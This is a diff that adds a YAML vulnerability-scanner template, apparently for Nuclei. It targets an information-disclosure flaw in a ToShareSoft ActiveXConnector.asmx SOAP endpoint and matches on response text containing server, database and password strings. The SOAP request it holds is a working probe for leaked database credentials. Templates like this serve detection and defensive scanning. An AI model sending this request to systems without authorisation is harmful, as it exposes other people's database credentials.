@@ -1,0 +1,30 @@
+id: poc-yaml-tosharesoft-activexconnector-info-leak
+info:
+  name: ActiveXConnector.asmx Information Disclosure Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        POST /Service/ActiveXConnector.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <tem:GetActivexConnector/>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "server="
+          - "database="
+          - "password="
+          - "<?xml version"
